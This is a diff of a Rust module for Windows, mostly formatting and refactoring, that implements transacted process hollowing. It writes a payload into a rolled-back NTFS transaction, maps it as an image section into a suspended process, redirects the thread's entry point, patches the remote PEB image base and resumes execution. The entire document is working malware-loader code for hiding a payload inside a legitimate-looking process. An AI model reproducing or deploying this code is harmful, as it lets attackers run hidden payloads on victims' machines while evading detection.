@@ -4,24 +4,39 @@
 
 extern crate alloc;
 
-use alloc::fmt::format;
-use core::ffi::{c_void, CStr};
+use alloc::vec::Vec;
+use core::ffi::c_void;
 use core::hint::spin_loop;
+use core::iter::once;
 use core::mem::zeroed;
 use core::ops::Deref;
 use core::ptr::{copy_nonoverlapping, null, null_mut};
-use utils::path::Path;
-use utils::{log_debug, WideString};
-use windows_sys::core::{PCSTR, PCWSTR, PWSTR};
-use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, BOOL, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, NTSTATUS, STATUS_IMAGE_NOT_AT_BASE, STATUS_SUCCESS, TRUE};
+use filesystem::path::Path;
+use filesystem::storage::StorageFileSystem;
+use filesystem::FileSystem;
+use windows_sys::core::{PCWSTR, PWSTR};
+use windows_sys::Win32::Foundation::{
+    CloseHandle, BOOL, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, NTSTATUS,
+    STATUS_IMAGE_NOT_AT_BASE, STATUS_SUCCESS, TRUE,
+};
 use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
-use windows_sys::Win32::Storage::FileSystem::{CreateFileTransactedW, CreateFileW, CreateTransaction, GetFileSize, RollbackTransaction, WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, OPEN_EXISTING};
-use windows_sys::Win32::System::Diagnostics::Debug::{GetThreadContext, SetThreadContext, WriteProcessMemory, CONTEXT, CONTEXT_INTEGER_AMD64, CONTEXT_INTEGER_X86, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_FILE_HEADER, IMAGE_NT_OPTIONAL_HDR64_MAGIC};
-use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
-use windows_sys::Win32::System::Memory::{CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, VirtualAlloc, VirtualProtectEx, FILE_MAP_READ, MEM_COMMIT, MEM_RESERVE, PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE, SECTION_ALL_ACCESS, SECTION_FLAGS, SEC_IMAGE};
-use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR, IMAGE_ORDINAL_FLAG32, IMAGE_ORDINAL_FLAG64};
-use windows_sys::Win32::System::Threading::{ResumeThread, CREATE_NO_WINDOW, CREATE_SUSPENDED, DETACHED_PROCESS, PROCESS_INFORMATION, STARTUPINFOW};
-use windows_sys::Win32::System::WindowsProgramming::{IMAGE_THUNK_DATA32, IMAGE_THUNK_DATA64};
+use windows_sys::Win32::Storage::FileSystem::{
+    CreateFileTransactedW, CreateFileW, CreateTransaction, GetFileSize, RollbackTransaction,
+    WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, OPEN_EXISTING,
+};
+use windows_sys::Win32::System::Diagnostics::Debug::{
+    GetThreadContext, SetThreadContext, WriteProcessMemory, CONTEXT, CONTEXT_INTEGER_AMD64,
+    CONTEXT_INTEGER_X86, IMAGE_FILE_HEADER, IMAGE_NT_OPTIONAL_HDR64_MAGIC,
+};
+use windows_sys::Win32::System::Memory::{
+    CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, VirtualAlloc, FILE_MAP_READ, MEM_COMMIT,
+    MEM_RESERVE, PAGE_READONLY, PAGE_READWRITE, SECTION_ALL_ACCESS, SECTION_FLAGS, SEC_IMAGE,
+};
+use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
+use windows_sys::Win32::System::Threading::{
+    ResumeThread, CREATE_NO_WINDOW, CREATE_SUSPENDED, DETACHED_PROCESS, PROCESS_INFORMATION,
+    STARTUPINFOW,
+};
 
 type PVoid = *mut c_void;
 type PByte = *mut u8;
@@ -30,7 +45,7 @@ macro_rules! module_function {
     (
         $module:expr,
         $name:ident,
-        fn($($arg:ident : $arg_ty:ty),*) -> $ret:ty
+        fn($($arg:ident : $arg_ty:ty),* $(,)?) -> $ret:ty
     ) => {
         #[allow(non_snake_case, clippy::too_many_arguments, clippy::missing_transmute_annotations)]
         unsafe fn $name($($arg: $arg_ty),*) -> $ret {
@@ -72,7 +87,7 @@ module_function!(
         current_directory: PCWSTR,
         startup_info: *mut STARTUPINFOW,
         process_information: *mut PROCESS_INFORMATION,
-        p_handle: *mut HANDLE
+        p_handle: *mut HANDLE,
     ) -> BOOL
 );
 
@@ -86,7 +101,7 @@ module_function!(
         maximum_size: *mut i64,
         section_page_protection: u32,
         allocation_attributes: u32,
-        file_handle: HANDLE
+        file_handle: HANDLE,
     ) -> NTSTATUS
 );
 
@@ -103,7 +118,7 @@ module_function!(
         view_size: *mut usize,
         inherit_disposition: u32,
         allocation_type: u32,
-        win32_protect: u32
+        win32_protect: u32,
     ) -> NTSTATUS
 );
 
@@ -115,11 +130,15 @@ macro_rules! check {
     };
 }
 
-pub fn make_transacted_section<S>(dummy_name: S, payload: PByte, payload_size: usize) -> Result<HANDLE, i32>
+pub fn make_transacted_section<S>(
+    dummy_name: S,
+    payload: PByte,
+    payload_size: usize,
+) -> Result<HANDLE, i32>
 where
-    S: AsRef<str>
+    S: AsRef<str>,
 {
-    let dummy_name = dummy_name.as_ref().to_wide();
+    let dummy_name = to_wide(dummy_name.as_ref());
 
     let options = 0u32;
     let isolation_lvl = 0u32;
@@ -134,7 +153,7 @@ where
             isolation_lvl,
             isolation_flags,
             timeout,
-            null_mut()
+            null_mut(),
         )
     };
 
@@ -151,7 +170,7 @@ where
             null_mut(),
             transaction,
             null_mut(),
-            null_mut()
+            null_mut(),
         )
     };
 
@@ -164,9 +183,10 @@ where
             payload,
             payload_size as _,
             &mut written_len,
-            null_mut()
+            null_mut(),
         )
-    } == FALSE {
+    } == FALSE
+    {
         return Err(INVALID_HANDLE_VALUE as _);
     }
 
@@ -179,25 +199,20 @@ where
             null_mut(),
             PAGE_READONLY,
             SEC_IMAGE,
-            transacted_file
+            transacted_file,
         )
-    } != STATUS_SUCCESS {
+    } != STATUS_SUCCESS
+    {
         return Err(INVALID_HANDLE_VALUE as _);
     }
 
-    unsafe {
-        CloseHandle(transacted_file)
-    };
+    unsafe { CloseHandle(transacted_file) };
 
-    if unsafe {
-        RollbackTransaction(transaction)
-    } == FALSE {
+    if unsafe { RollbackTransaction(transaction) } == FALSE {
         return Err(INVALID_HANDLE_VALUE as _);
     }
 
-    unsafe {
-        CloseHandle(transaction)
-    };
+    unsafe { CloseHandle(transaction) };
 
     Ok(section)
 }
@@ -205,10 +220,10 @@ where
 pub fn create_new_process_internal<C, S>(cmd_line: C, start_dir: S) -> Option<PROCESS_INFORMATION>
 where
     C: AsRef<str>,
-    S: AsRef<str>
+    S: AsRef<str>,
 {
-    let mut cmd_line = cmd_line.as_ref().to_wide();
-    let mut start_dir = start_dir.as_ref().to_wide();
+    let mut cmd_line = to_wide(cmd_line.as_ref());
+    let mut start_dir = to_wide(start_dir.as_ref());
 
     let mut si: STARTUPINFOW = unsafe { zeroed() };
     si.cb = size_of::<STARTUPINFOW>() as u32;
@@ -233,7 +248,8 @@ where
             &mut pi as *mut _ as _,
             &mut new_token as *mut _ as _,
         )
-    } == FALSE {
+    } == FALSE
+    {
         None
     } else {
         Some(pi)
@@ -255,7 +271,7 @@ pub fn map_buffer_into_process(pi: &PROCESS_INFORMATION, section: HANDLE) -> Opt
             &mut view_size,
             1, // ViewShare
             0,
-            PAGE_READONLY
+            PAGE_READONLY,
         )
     };
 
@@ -268,9 +284,9 @@ pub fn map_buffer_into_process(pi: &PROCESS_INFORMATION, section: HANDLE) -> Opt
 
 pub fn get_payload_buffer<S>(filename: S) -> Option<(PByte, usize)>
 where
-    S: AsRef<str>
+    S: AsRef<str>,
 {
-    let filename = filename.as_ref().to_wide();
+    let filename = to_wide(filename.as_ref());
     let file = unsafe {
         CreateFileW(
             filename.as_ptr(),
@@ -283,28 +299,15 @@ where
         )
     };
 
-    let mapping = unsafe {
-        CreateFileMappingW(
-            file,
-            null_mut(),
-            PAGE_READONLY,
-            0,
-            0,
-            null_mut()
-        )
-    };
+    let mapping = unsafe { CreateFileMappingW(file, null_mut(), PAGE_READONLY, 0, 0, null_mut()) };
 
     if mapping.is_null() {
-        unsafe {
-            CloseHandle(file)
-        };
+        unsafe { CloseHandle(file) };
 
         return None;
     }
 
-    let dll_data = unsafe {
-        MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0)
-    };
+    let dll_data = unsafe { MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0) };
 
     let dll_raw_data = dll_data.Value as PByte;
 
@@ -324,7 +327,7 @@ where
             null(),
             payload_size,
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE
+            PAGE_READWRITE,
         )
     } as PByte;
 
@@ -333,13 +336,9 @@ where
     }
 
     unsafe {
-        copy_nonoverlapping(
-            dll_raw_data,
-            local_copy_address,
-            payload_size
-        );
+        copy_nonoverlapping(dll_raw_data, local_copy_address, payload_size);
     }
-    
+
     unsafe {
         UnmapViewOfFile(dll_data);
         CloseHandle(mapping);
@@ -347,6 +346,10 @@ where
     }
 
     Some((local_copy_address, payload_size))
+}
+
+fn to_wide(str: &str) -> Vec<u16> {
+    str.encode_utf16().chain(once(0)).collect()
 }
 
 fn thread_context(pi: &PROCESS_INFORMATION) -> Option<CONTEXT> {
@@ -372,14 +375,12 @@ fn thread_context(pi: &PROCESS_INFORMATION) -> Option<CONTEXT> {
 
 fn update_remove_ep(pi: &PROCESS_INFORMATION, ep_va: u64) -> bool {
     let Some(mut context) = thread_context(pi) else {
-        return false
+        return false;
     };
 
     context.Rcx = ep_va;
 
-    unsafe {
-        SetThreadContext(pi.hThread, &context) == TRUE
-    }
+    unsafe { SetThreadContext(pi.hThread, &context) == TRUE }
 }
 
 fn get_remote_peb_address(pi: &PROCESS_INFORMATION) -> Option<u64> {
@@ -389,7 +390,7 @@ fn get_remote_peb_address(pi: &PROCESS_INFORMATION) -> Option<u64> {
 #[derive(PartialEq)]
 enum PeArchitecture {
     X64,
-    X86
+    X86,
 }
 
 fn pe_architecture(pe_buffer: PByte) -> PeArchitecture {
@@ -403,7 +404,7 @@ fn pe_architecture(pe_buffer: PByte) -> PeArchitecture {
 
         match magic {
             IMAGE_NT_OPTIONAL_HDR64_MAGIC => PeArchitecture::X64,
-            _ => PeArchitecture::X86
+            _ => PeArchitecture::X86,
         }
     }
 }
@@ -435,12 +436,6 @@ fn get_ep_rva(pe_buffer: PByte) -> u32 {
     image_pe_header_field!(pe_buffer, OptionalHeader.AddressOfEntryPoint)
 }
 
-fn get_image_import_data_dir(pe_buffer: PByte) -> (*const IMAGE_IMPORT_DESCRIPTOR, u32) {
-    let dir = image_pe_header_field!(pe_buffer, OptionalHeader.DataDirectory)[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
-    let desc = unsafe { pe_buffer.add(dir.VirtualAddress as usize) } as *const IMAGE_IMPORT_DESCRIPTOR;
-    (desc, dir.Size)
-}
-
 fn redirect_ep(loaded_pe: PByte, loaded_base: PVoid, pi: &PROCESS_INFORMATION) -> bool {
     let ep = get_ep_rva(loaded_pe);
     let ep_va = (loaded_base as u64 as usize).wrapping_add(ep as usize) as u64;
@@ -450,7 +445,7 @@ fn redirect_ep(loaded_pe: PByte, loaded_base: PVoid, pi: &PROCESS_INFORMATION) -
 
 fn set_new_image_base(loaded_base: PVoid, pi: &PROCESS_INFORMATION) -> bool {
     let Some(remote_peb_address) = get_remote_peb_address(pi) else {
-        return false
+        return false;
     };
 
     let img_base_size = size_of::<u64>();
@@ -463,26 +458,26 @@ fn set_new_image_base(loaded_base: PVoid, pi: &PROCESS_INFORMATION) -> bool {
             remote_img_base,
             &loaded_base as *const _ as PVoid,
             img_base_size,
-            null_mut()
+            null_mut(),
         ) == TRUE
     }
 }
 
 fn redirect_to_payload(loaded_pe: PByte, loaded_base: PVoid, pi: &PROCESS_INFORMATION) -> bool {
     if !redirect_ep(loaded_pe, loaded_base, pi) {
-        return false
+        return false;
     }
-    
+
     if !set_new_image_base(loaded_base, pi) {
-        return false
+        return false;
     }
-    
+
     true
 }
 
 pub fn hollow(target: &Path, payload: PByte, payload_size: usize) -> Option<PROCESS_INFORMATION> {
     let tmp = Path::temp_file("tmp");
-    let _ = tmp.create_file();
+    let _ = StorageFileSystem.create_file(&tmp);
 
     let section = make_transacted_section(tmp.deref(), payload, payload_size).ok()?;
 
@@ -493,9 +488,7 @@ pub fn hollow(target: &Path, payload: PByte, payload_size: usize) -> Option<PROC
     if !redirect_to_payload(payload, remote_base, &pi) {
         None
     } else {
-        unsafe {
-            ResumeThread(pi.hThread)
-        };
+        unsafe { ResumeThread(pi.hThread) };
 
         Some(pi)
     }
